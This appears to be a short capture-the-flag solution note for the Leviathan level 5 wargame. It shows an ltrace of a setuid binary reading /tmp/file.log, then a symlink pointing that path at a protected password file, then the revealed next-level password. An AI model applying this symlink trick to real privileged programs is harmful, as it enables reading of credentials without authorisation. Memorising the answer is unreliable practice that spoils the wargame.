@@ -1,0 +1,17 @@
+touch /tmp/file.log
+
+
+ltrace ./leviathan5 
+__libc_start_main(0x8049206, 1, 0xffffd694, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                         = 0x804d1a0
+fgetc(0x804d1a0)                                                                    = '\377'
+feof(0x804d1a0)                                                                     = 1
+fclose(0x804d1a0)                                                                   = 0
+getuid()                                                                            = 12005
+setuid(12005)                                                                       = 0
+unlink("/tmp/file.log")                                                             = 0
++++ exited (status 0) +++
+
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+./leviathan5 
+YZ55XPVk2l
